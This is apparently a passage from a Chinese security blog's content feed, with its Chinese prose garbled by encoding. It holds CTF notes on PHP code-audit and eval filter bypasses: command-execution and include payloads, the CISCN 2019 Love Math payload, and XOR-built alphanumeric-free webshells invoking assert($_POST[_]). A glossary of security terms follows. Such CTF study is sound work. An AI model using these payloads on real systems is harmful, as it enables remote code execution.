class="line">)</span><br></pre></td></tr></table></figure><blockquote><p>å¯ä»¥çœ‹åˆ°parse_urlè§£ææ—¶ï¼Œ&#x2F;xxxè§£æä¸ºè·¯å¾„ï¼Œ&#x2F;&#x2F;xxxè§£æä¸ºä¸»æœº</p></blockquote></li></ol><h2 id="is-file"><a href="#is-file" class="headerlink" title="is_file"></a>is_file</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span> == <span class="string">&quot;f14g.php&quot;</span> OR <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>ä¼ªåè®®  is_fileæ£€æµ‹é™¤äº†fileå¤–çš„ä¼ªåè®®éƒ½æ˜¯false    </li><li>å‡ç›®å½•   <code>./xxx/../f14g.php </code></li></ul><h2 id="strip-tags"><a href="#strip-tags" class="headerlink" title="strip_tags"></a>strip_tags</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]), <span class="string">&quot;.php&quot;</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]  = <span class="title function_ invoke__">strip_tags</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]=<span class="number">1</span>.&lt;&gt;php</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ä»£ç æ‰§è¡Œç»•è¿‡</title>
      <link href="/2023/05/31/PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/"/>
      <url>/2023/05/31/PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="ç»•è¿‡é•¿åº¦"><a href="#ç»•è¿‡é•¿åº¦" class="headerlink" title="ç»•è¿‡é•¿åº¦"></a>ç»•è¿‡é•¿åº¦</h2><p><a href="https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html">https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot; &quot;</span>, <span class="variable">$get</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$get</span>)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;This is too long.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$get</span>);</span><br><span class="line">          &#125; </span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>å‘½ä»¤æ‰§è¡Œç»•è¿‡</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get=`<span class="variable">$_GET</span>[<span class="number">1</span>]`;&amp;<span class="number">1</span>=bash</span><br></pre></td></tr></table></figure></li><li><p>è¿œç¨‹æ–‡ä»¶åŒ…å«</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>];</span><br></pre></td></tr></table></figure></li><li><p>æœ¬åœ°æ–‡ä»¶åŒ…å«</p><ul><li>file_put_contents</li><li>æ—¥å¿—æ–‡ä»¶åŒ…å«</li></ul></li><li><p>åˆ©ç”¨å˜é•¿å‚æ•°ç‰¹æ€§å±•å¼€æ•°ç»„â€“<strong>php 5.6</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET:<span class="number">1</span>[]=test&amp;<span class="number">1</span>[]=<span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>);&amp;<span class="number">2</span>=assert</span><br><span class="line">POST:param=<span class="title function_ invoke__">usort</span>(...<span class="variable">$_GET</span>);</span><br></pre></td></tr></table></figure></li></ul><h2 id="ç»•è¿‡å‰ç½®æ··æ·†å­—ç¬¦"><a href="#ç»•è¿‡å‰ç½®æ··æ·†å­—ç¬¦" class="headerlink" title="ç»•è¿‡å‰ç½®æ··æ·†å­—ç¬¦"></a>ç»•è¿‡å‰ç½®æ··æ·†å­—ç¬¦</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">str = ä»»æ„å­—ç¬¦ä¸²</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;#&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol><li><p>é—­åˆphpæ ‡ç­¾</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cmd=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> payload; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>æ¢è¡Œç»•è¿‡</p><ul><li>%0a</li><li>\n</li><li>\r</li></ul></li></ol><h2 id="ç»•è¿‡å­—ç¬¦ç§ç±»æ•°é‡"><a href="#ç»•è¿‡å­—ç¬¦ç§ç±»æ•°é‡" class="headerlink" title="ç»•è¿‡å­—ç¬¦ç§ç±»æ•°é‡"></a>ç»•è¿‡å­—ç¬¦ç§ç±»æ•°é‡</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">result2 = [<span class="number">0x8b</span>, <span class="number">0x9b</span>, <span class="number">0xa0</span>, <span class="number">0x9c</span>, <span class="number">0x8f</span>, <span class="number">0x91</span>, <span class="number">0x9e</span>, <span class="number">0xd1</span>, <span class="number">0x96</span>, <span class="number">0x8d</span>, <span class="number">0x8c</span>] </span><br><span class="line">result = [<span class="number">0x9b</span>, <span class="number">0xa0</span>, <span class="number">0x9c</span>, <span class="number">0x8f</span>, <span class="number">0x9e</span>, <span class="number">0xd1</span>, <span class="number">0x96</span>, <span class="number">0x8c</span>]  <span class="comment"># to be deleted</span></span><br><span class="line">temp = <span class="built_in">set</span>()</span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> result2:</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> result:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> result:</span><br><span class="line">                <span class="keyword">if</span> (a ^ b ^ c == d):</span><br><span class="line">                    <span class="keyword">if</span> a == b == c == d:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;a=0x%x,b=0x%x,c=0x%x,d=0x%x&quot;</span> % (a, b, c, d))</span><br><span class="line">                        temp.add(<span class="built_in">hex</span>(d))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(temp), temp)</span><br></pre></td></tr></table></figure><blockquote><p>result2ä¸­çš„å­—ç¬¦ç”¨resultä¸­çš„å­—ç¬¦ä»£æ›¿ï¼Œd&#x3D;a^b^c^d,è¿™æ ·å°±å‡å°‘äº†ä¸€ç§å­—ç¬¦ç§ç±»</p></blockquote><h2 id="çˆ†ç ´å¯ç”¨å­—ç¬¦-x2F-å¯ç”¨å‡½æ•°"><a href="#çˆ†ç ´å¯ç”¨å­—ç¬¦-x2F-å¯ç”¨å‡½æ•°" class="headerlink" title="çˆ†ç ´å¯ç”¨å­—ç¬¦&#x2F;å¯ç”¨å‡½æ•°"></a>çˆ†ç ´å¯ç”¨å­—ç¬¦&#x2F;å¯ç”¨å‡½æ•°</h2><blockquote><p>åœ¨æµè§ˆå™¨ä¸­æŸ¥çœ‹ç»“æœ</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$preg</span> =<span class="string">&#x27;/\&#x27;|\`|\\|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&#x27;</span>;</span><br><span class="line">å¯ç”¨å­—ç¬¦</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$a</span>=<span class="number">0</span>;<span class="variable">$a</span>&lt;<span class="number">128</span>;<span class="variable">$a</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span>, <span class="title function_ invoke__">chr</span>(<span class="variable">$a</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="variable">$a</span>).<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#å¯ç”¨å‡½æ•°</span></span><br><span class="line"><span class="comment">#è·å–å†…ç½®å‡½æ•° </span></span><br><span class="line"><span class="variable">$arr</span> = <span class="title function_ invoke__">get_defined_functions</span>()[<span class="string">&#x27;internal&#x27;</span>];</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span>, <span class="variable">$value</span>) )&#123;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$arr</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$arr</span>);</span><br></pre></td></tr></table></figure><h2 id="æ•°å­¦å‡½æ•°æ„é€ payload"><a href="#æ•°å­¦å‡½æ•°æ„é€ payload" class="headerlink" title="æ•°å­¦å‡½æ•°æ„é€ payload"></a>æ•°å­¦å‡½æ•°æ„é€ payload</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">hex2bin</span>(<span class="string">&#x27;706870696e666f&#x27;</span>) â†’phpinfo</span><br><span class="line"><span class="title function_ invoke__">hex2bin</span>(<span class="string">&#x27;73797374656d&#x27;</span>)  â†’ system  </span><br></pre></td></tr></table></figure><h4 id="CISCN-2019-åˆèµ›-Love-Math"><a href="#CISCN-2019-åˆèµ›-Love-Math" class="headerlink" title="[CISCN 2019 åˆèµ›]Love Math"></a>[CISCN 2019 åˆèµ›]Love Math</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$content</span>=<span class="title function_ invoke__">system</span>(cat /flag)</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">é»‘åå•ï¼šç©ºæ ¼,\t,\r,\n,<span class="string">&#x27;&#x27;</span>,<span class="string">&quot;&quot;</span>,[]</span><br><span class="line">    </span><br><span class="line">æ­£åˆ™åŒ¹é…è¡¨è¾¾å¼ï¼š/[a-zA-Z_\x7f-\xff][a-zA-Z_0-<span class="number">9</span>\x7f-\xff]*/</span><br><span class="line">æ­£åˆ™åŒ¹é…åˆ°çš„éƒ¨åˆ†è¿›è¡Œç™½åå•è¿‡æ»¤    </span><br><span class="line">ç™½åå•ï¼šåªèƒ½ä½¿ç”¨æ•°å­¦å‡½æ•°  </span><br><span class="line"></span><br><span class="line">è¿™é‡Œåˆ©ç”¨phpçš„åŠ¨æ€å‡½æ•°</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(cat /flag);</span><br><span class="line">ç­‰ä»·ä¸<span class="title function_ invoke__">system</span>(cat /flag)</span><br><span class="line">æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ„é€ <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]=system <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]=cat /flag  <span class="variable">$a</span>(<span class="variable">$b</span>)</span><br><span class="line"></span><br><span class="line">éœ€è¦æˆ‘ä»¬æ„é€ çš„æ˜¯_GETå’Œ[]ï¼Œ[]å¯ä»¥ç”¨&#123;&#125;æ›¿ä»£ï¼Œ_GETç”¨<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">dechex</span>(_GETå¯¹åº”çš„åè¿›åˆ¶))</span><br><span class="line">å› ä¸ºæœ‰æ­£åˆ™ï¼Œæ‰€ä»¥åªèƒ½ç”¨ä¸å«æœ‰å­—æ¯çš„è¿›åˆ¶å¦‚<span class="number">10</span>è¿›åˆ¶æˆ–è€…<span class="number">8</span>è¿›åˆ¶ï¼Œæ‰€ä»¥éœ€è¦ç”¨dechexå°†<span class="number">10</span>è¿›åˆ¶è½¬ä¸º<span class="number">16</span>è¿›åˆ¶</span><br><span class="line">hex2binä¹Ÿä¸èƒ½å‡ºç°ï¼Œç”¨<span class="title function_ invoke__">base_convert</span>()æ¥ç”Ÿæˆï¼š</span><br><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)</span><br><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">432335067717</span>,<span class="number">8</span>,<span class="number">36</span>)</span><br><span class="line"> </span><br><span class="line">å°†_GETä¿å­˜åœ¨å˜é‡ä¸­ï¼ˆä¸ºäº†ä¿è¯é•¿åº¦å°äº<span class="number">80</span>ï¼‰</span><br><span class="line"><span class="variable">$pi</span>=<span class="variable">$base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(_GETå¯¹åº”çš„åè¿›åˆ¶))â†’_GET</span><br><span class="line"><span class="variable">$$pi</span>&#123;pi&#125;â†’<span class="variable">$_GET</span>[pi]</span><br><span class="line"><span class="variable">$$pi</span>&#123;abs&#125;â†’<span class="variable">$_GET</span>[abs]</span><br><span class="line"></span><br><span class="line">æœ€ç»ˆpayloadï¼š</span><br><span class="line">?c=<span class="variable">$pi</span>=<span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>));<span class="variable">$$pi</span>&#123;pi&#125;(<span class="variable">$$pi</span>&#123;abs&#125;)&amp;pi=system&amp;abs=cat /flag    </span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220626151220775-1687682103386.png" alt="image-20220626151220775"></p><p><img src="/../images/image-20220626151314181-1687682103387.png" alt="image-20220626151314181"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¸ç›´æ¥ç”¨hex2bin(dechex(system cat /flagå¯¹åº”çš„åè¿›åˆ¶))æ˜¯å› ä¸ºæ•°å€¼è¶…è¿‡dechexçš„å¤„ç†èŒƒå›´ï¼Œè¿”å›ä¸º0</span><br></pre></td></tr></table></figure><h2 id="æ— å­—æ¯æ•°å­—å’Œä¸€äº›ç¬¦å·"><a href="#æ— å­—æ¯æ•°å­—å’Œä¸€äº›ç¬¦å·" class="headerlink" title="æ— å­—æ¯æ•°å­—å’Œä¸€äº›ç¬¦å·"></a>æ— å­—æ¯æ•°å­—å’Œä¸€äº›ç¬¦å·</h2><p><a href="https://www.hetianlab.com/specialized/20201124173456">https://www.hetianlab.com/specialized/20201124173456</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="åˆ©ç”¨ç©ºå­—ç¬¦-è¿ç®—æ„é€ "><a href="#åˆ©ç”¨ç©ºå­—ç¬¦-è¿ç®—æ„é€ " class="headerlink" title="åˆ©ç”¨ç©ºå­—ç¬¦^è¿ç®—æ„é€ "></a>åˆ©ç”¨ç©ºå­—ç¬¦^è¿ç®—æ„é€ </h4><ul><li><p>å•ä¸ªå­—ç¬¦</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">127</span>;<span class="variable">$i</span>&lt;<span class="number">255</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">127</span>;<span class="variable">$j</span>&lt;<span class="number">255</span>;<span class="variable">$j</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%s^%s&quot;</span>,<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)),<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$j</span>))).<span class="string">&quot;=&gt;&quot;</span>. (<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)^<span class="title function_ invoke__">chr</span>(<span class="variable">$j</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">%<span class="number">8</span>C^%FF=&gt;s</span><br></pre></td></tr></table></figure><blockquote><p>((%FE^%AE).(%FE^%96).(%FE^%AE).(%FE^%97).(%FE^%90).(%FE^%98).(%FD^%92))(); â†’phpinfo();</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%12&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%14&#x27;</span>^<span class="string">&#x27;`&#x27;</span>); <span class="comment">// $_=&#x27;assert&#x27;;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%2F&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;]&#x27;</span>); <span class="comment">// $__=&#x27;_POST&#x27;;</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;</span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]); <span class="comment">// assert($_POST[_]);</span></span><br></pre></td></tr></table></figure></blockquote></li><li><p>å­—ç¬¦ä¸²</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">#æƒ³æ„é€ çš„å­—ç¬¦ä¸²  print_r(scandir(&#x27;.&#x27;))</span></span><br><span class="line"><span class="variable">$x</span> = <span class="string">&#x27;scandir&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$x</span>); <span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$payload</span> .= <span class="string">&#x27;%ff&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>.=<span class="string">&#x27;^&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$x</span>); <span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">127</span>; <span class="variable">$j</span> &lt; <span class="number">255</span>; <span class="variable">$j</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">#chr(255)é€‰æ‹©å“ªä¸€ä¸ªä¸å¯è§å­—ç¬¦æ¥æ„é€ </span></span><br><span class="line">        <span class="variable">$k</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$j</span>) ^ <span class="title function_ invoke__">chr</span>(<span class="number">255</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$k</span> == <span class="variable">$x</span>[<span class="variable">$i</span>]) </span><br><span class="line">      &#123;</span><br><span class="line">            <span class="variable">$payload</span> .= <span class="string">&#x27;%&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br></pre></td></tr></table></figure><blockquote><p>$</p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>è®¡ç®—æœºåè¯è§£é‡Š</title>
      <link href="/2023/05/30/%E6%A6%82%E5%BF%B5/"/>
      <url>/2023/05/30/%E6%A6%82%E5%BF%B5/</url>
      
        <content type="html"><![CDATA[<h1 id="å¸¸è§åè¯è§£é‡Š"><a href="#å¸¸è§åè¯è§£é‡Š" class="headerlink" title="å¸¸è§åè¯è§£é‡Š"></a>å¸¸è§åè¯è§£é‡Š</h1><table><thead><tr><th align="center">åè¯</th><th align="center">è§£é‡Š</th></tr></thead><tbody><tr><td align="center">0day(Zero-day)</td><td align="center">æ²¡æœ‰è¡¥ä¸çš„å®‰å…¨æ¼æ´</td></tr><tr><td align="center">Nday</td><td align="center">å®˜æ–¹å‘å¸ƒäº†è¡¥ä¸ï¼Œä½†è¯¥æ¼æ´ä»ç„¶å¤§é‡æœªä¿®å¤ï¼Œå­˜åœ¨ä¸€å®šå¯åˆ©ç”¨æ€§</td></tr><tr><td align="center">POC</td><td align="center">ä¸€æ®µæ— å®³çš„ç”¨æ¥è¯æ˜æ¼æ´å­˜åœ¨çš„ä»£ç </td></tr><tr><td align="center">EXPï¼ˆexploitï¼‰</td><td align="center">ä¸€æ®µå¯¹æ¼æ´å¦‚ä½•åˆ©ç”¨çš„è¯¦ç»†è¯´æ˜æˆ–è€…ä¸€ä¸ªæ¼”ç¤ºçš„æ¼æ´æ”»å‡»ä»£ç </td></tr><tr><td align="center">payloadï¼ˆæœ‰æ•ˆè½½è·ï¼‰</td><td align="center">æŒ‡æˆåŠŸ exploit ä¹‹åï¼ŒçœŸæ­£åœ¨ç›®æ ‡ç³»ç»Ÿæ‰§è¡Œçš„ä»£ç æˆ–æŒ‡ä»¤</td></tr><tr><td align="center">CVE</td><td align="center">Common Vulnerabilities &amp; Exposures å…¬å…±æ¼æ´å’Œæš´éœ²      CVEç¼–å·â€“æ¼æ´æ ‡ç­¾</td></tr><tr><td align="center">ShellCode</td><td align="center">ä¸€æ®µ16è¿›åˆ¶æœºå™¨ç ï¼Œå¯åœ¨æš‚å­˜å™¨eipæº¢å‡ºåï¼Œå¡å…¥ä¸€æ®µå¯è®©CPUæ‰§è¡Œçš„shellcodeæœºå™¨ç ï¼Œä»è€Œæ‰§è¡Œä»»æ„æŒ‡ä»¤ï¼ŒEIP<code>å¯„å­˜å™¨ï¼Œå®ƒé‡Œé¢å­˜æ”¾çš„å€¼æ˜¯</code>CPU<code>ä¸‹æ¬¡è¦æ‰§è¡Œçš„æŒ‡ä»¤åœ°å€ï¼Œå› æ­¤å¯ä»¥é€šè¿‡ä¿®æ”¹</code>EIP<code>å¯„å­˜å™¨çš„å€¼æ¥æ‰§è¡Œ</code>shellcode</td></tr><tr><td align="center">FUZZ</td><td align="center">æ¨¡ç³Šæµ‹è¯•ï¼šéšæœºè¾“å…¥ï¼Œè§‚å¯Ÿè¾“</td></tr><tr><td align="center">CMS</td><td align="center">å†…å®¹ç®¡ç†ç³»ç»Ÿï¼šæŒ‡çš„æ˜¯ä¸€ç§å†…å®¹ç¼–è¾‘ç¨‹åºã€‚å°±åƒåœ¨åšå®¢å†™æ–‡ç« ä¸€æ ·ï¼Œä¸éœ€è¦æ‡‚å¾—ç¼–ç¨‹çš„äººï¼Œä¹Ÿå¯ä»¥é€šè¿‡CMSå‘å¸ƒï¼Œæ›´æ”¹ï¼Œç®¡ç†å†…å®¹ã€‚</td></tr><tr><td align="center">CNVD</td><td align="center">China National Vulnerability Database                                   å›½å®¶ä¿¡æ¯å®‰å…¨æ¼æ´å…±äº«å¹³å°</td></tr><tr><td align="center">Rootkit</td><td align="center">è½½å…¥åˆ°æ“ä½œç³»ç»Ÿå†…æ ¸ä¸­çš„æ¶æ„è½¯ä»¶ï¼Œå…·æœ‰rootæƒé™</td></tr><tr><td align="center">WAF</td><td align="center">Webåº”ç”¨é˜²ç«å¢™ï¼Œå…·æœ‰é’ˆå¯¹ HTTP&#x2F;HTTPS çš„å®‰å…¨ç­–ç•¥</td></tr><tr><td align="center">å ¡å’æœº</td><td align="center">ç›‘æ§å’Œè®°å½•è¿ç»´äººå‘˜å¯¹ç½‘ç»œå†…çš„æœåŠ¡å™¨ã€ç½‘ç»œè®¾å¤‡ã€å®‰å…¨è®¾å¤‡ã€æ•°æ®åº“ç­‰è®¾å¤‡çš„æ“ä½œè¡Œä¸ºï¼Œä»¥ä¾¿é›†ä¸­æŠ¥è­¦ã€åŠæ—¶å¤„ç†åŠå®¡è®¡å®šè´£ã€‚</td></tr><tr><td align="center">å½©è™¹è¡¨</td><td align="center">ç©ºé—´æ¢æ—¶é—´ï¼Œé€šè¿‡å“ˆå¸Œç¢°æ’ç ´è§£å“ˆå¸Œå€¼</td></tr><tr><td align="center">ä¾›åº”é“¾æ”»å‡»</td><td align="center">æ”»å‡»è½¯ä»¶ä¾›åº”å•†ï¼Œå¦‚å‘æ›´æ–°ç¨‹åºä¸­æ³¨å…¥æœ¨é©¬</td></tr><tr><td align="center">æ²™ç®±</td><td align="center">è™šæ‹Ÿç³»ç»Ÿç¨‹åºï¼š     åœ¨éš”ç¦»ç¯å¢ƒä¸­ï¼Œç”¨ä»¥æµ‹è¯•ä¸å—ä¿¡ä»»çš„æ–‡ä»¶æˆ–åº”ç”¨ç¨‹åºç­‰è¡Œä¸ºçš„å·¥å…·</td></tr><tr><td align="center">åŸŸåæ³›è§£æ</td><td align="center"><code>*.a.com</code>æŒ‡å‘åŒä¸€IP</td></tr><tr><td align="center">OSINT</td><td align="center"><strong>å…¬å¼€æ¥æºæƒ…æŠ¥</strong>ï¼ˆOSINT, Open Source INTelligenceï¼‰æ˜¯ä»å…¬å¼€æ¥æºæ”¶é›†åˆ°çš„æƒ…æŠ¥</td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr></tbody></table><h1 id="è 